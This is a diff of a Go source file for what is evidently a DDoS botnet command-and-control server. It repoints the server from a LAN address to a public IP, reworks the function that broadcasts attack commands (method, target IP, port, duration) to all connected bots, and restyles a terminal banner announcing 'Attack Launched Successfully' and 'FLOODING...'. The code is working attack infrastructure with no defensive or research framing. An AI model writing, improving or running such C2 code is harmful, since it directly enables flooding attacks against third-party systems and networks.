@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/binary"
@@ -21,8 +22,8 @@ import (
 
 const (
 	USERS_FILE       = "data/json/users.json"
-	USER_SERVER_IP   = "192.168.0.216"
-	BOT_SERVER_IP    = "192.168.0.216"
+	USER_SERVER_IP   = "45.59.124.135"
+	BOT_SERVER_IP    = "45.59.124.135"
 	BOT_SERVER_PORT  = "7002"
 	USER_SERVER_PORT = "420"
 	CERT_FILE        = "data/certs/server.crt"
@@ -397,38 +398,81 @@ func getFromConn(conn net.Conn) (string, error) {
 }
 
 func sendToBots(cmdPacket CommandPacket) {
-	method := strings.TrimRight(string(cmdPacket.Method[:]), "\x00")
+	method := strings.TrimRight(string(bytes.TrimRight(cmdPacket.Method[:], "\x00")), " ")
+
+	// Debug logging
+	fmt.Printf("[C2] Preparing to send command: %s to target %s:%d for %d seconds\n",
+		method, net.IP(cmdPacket.TargetIP[:]).String(), cmdPacket.Port, cmdPacket.Duration)
+
 	if !validateCommand(method) {
 		LogSystem("ERROR", "INVALID_COMMAND", fmt.Sprintf("Attempted to send invalid command: %s", method))
 		return
 	}
 
-	cmdData := make([]byte, 42)
-	copy(cmdData[0:16], cmdPacket.Method[:])
-	copy(cmdData[16:20], cmdPacket.TargetIP[:])
-	binary.BigEndian.PutUint16(cmdData[20:22], cmdPacket.Port)
-	binary.BigEndian.PutUint32(cmdData[22:26], cmdPacket.Duration)
-	copy(cmdData[26:42], cmdPacket.Reserved[:])
+	// Log the command being sent
+	LogSystem("DEBUG", "SENDING_COMMAND", fmt.Sprintf("Method: %s, Target: %s:%d, Duration: %d",
+		method, net.IP(cmdPacket.TargetIP[:]).String(), cmdPacket.Port, cmdPacket.Duration))
 
-	packet := CreatePacket(PacketTypeCommand, cmdData)
-	serializedPacket, err := SerializePacket(packet)
-	if err != nil {
-		fmt.Printf("Error serializing packet: %v\n", err)
+	// Get all active bot connections
+	botConnections := botManager.GetAllBots()
+
+	if len(botConnections) == 0 {
+		LogSystem("WARN", "NO_BOTS", "No bots connected to send commands to")
 		return
 	}
 
-	connectionPool.mutex.RLock()
-	defer connectionPool.mutex.RUnlock()
+	// Create the packet
+	packet := CreatePacket(PacketTypeCommand, cmdPacketToBytes(cmdPacket))
+	serializedPacket, err := SerializePacket(packet)
+	if err != nil {
+		fmt.Printf("[C2] Error serializing packet: %v\n", err)
+		return
+	}
 
-	for addr, pooledConn := range connectionPool.pool {
-		if pooledConn.conn != nil {
-			_, err := pooledConn.conn.Write(serializedPacket)
+	// Send to all bots
+	sentCount := 0
+	for botID, botConn := range botConnections {
+		if botConn != nil {
+			// Set write deadline to prevent hanging
+			botConn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+
+			_, err := botConn.Write(serializedPacket)
 			if err != nil {
-				fmt.Printf("Error sending to bot %s: %v\n", addr, err)
-				connectionPool.Remove(addr)
+				fmt.Printf("[C2] Error sending to bot %s: %v\n", botID, err)
+				// Remove dead connection
+				botManager.RemoveBot(botID)
+			} else {
+				sentCount++
+				fmt.Printf("[C2] Successfully sent command to bot %s\n", botID)
 			}
+
+			// Clear write deadline
+			botConn.SetWriteDeadline(time.Time{})
 		}
 	}
+
+	LogSystem("DEBUG", "COMMAND_SENT_COUNT", fmt.Sprintf("Sent command to %d bots out of %d total", sentCount, len(botConnections)))
+}
+
+func cmdPacketToBytes(cmd CommandPacket) []byte {
+	buf := make([]byte, 42)
+
+	// Method (16 bytes)
+	copy(buf[0:16], cmd.Method[:])
+
+	// Target IP (4 bytes)
+	copy(buf[16:20], cmd.TargetIP[:])
+
+	// Port (2 bytes)
+	binary.BigEndian.PutUint16(buf[20:22], cmd.Port)
+
+	// Duration (4 bytes)
+	binary.BigEndian.PutUint32(buf[22:26], cmd.Duration)
+
+	// Reserved (16 bytes)
+	copy(buf[26:42], cmd.Reserved[:])
+
+	return buf
 }
 
 func Ping(conn *tls.Conn, stopPing <-chan struct{}) {
@@ -625,19 +669,19 @@ func handleRequest(conn *tls.Conn) {
 
 					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mAttack Launched Successfully!\x1b[38;5;231m §           ║   ┌────────────────────┐   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │    ATTACK DEPLOYED   │   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Attack Parameters Confirmed\x1b[38;5;231m                 ║   │      ACTIVE        │   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n", method)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║   ────────────────────   ║\r\n", ip, port)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Duration:  \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", duration+" seconds")))
+					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mAttack Launched Successfully!\x1b[38;5;231m § ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   ATTACK DEPLOYED  │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Attack Parameters Confirmed\x1b[38;5;231m                 ║    │      ACTIVE        │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n", method)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m          ║     ────────────────────     ║\r\n", ip, port)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Duration:  \x1b[38;5;82m%-30s\x1b[38;5;231m ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", duration+" seconds")))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Network Status\x1b[38;5;231m                               ║   ┌────────────────────┐   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │   BOTS ENGAGED     │   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK INITIATED\x1b[38;5;231m                   ║   │    FLOODING...    │   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Bots:      \x1b[38;5;82mSENDING PACKETS\x1b[38;5;231m                   ║   └────────────────────┘   ║\n\r"))
-					conn.Write([]byte("\x11b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Network Status\x1b[38;5;231m                              ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   BOTS ENGAGED     │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK INITIATED\x1b[38;5;231m               ║    │    FLOODING...     │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Bots:      \x1b[38;5;82mSENDING PACKETS\x1b[38;5;231m                ║    └────────────────────┘    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
 
 					attackLock.Lock()
 					ongoingAttacks[conn] = Attack{
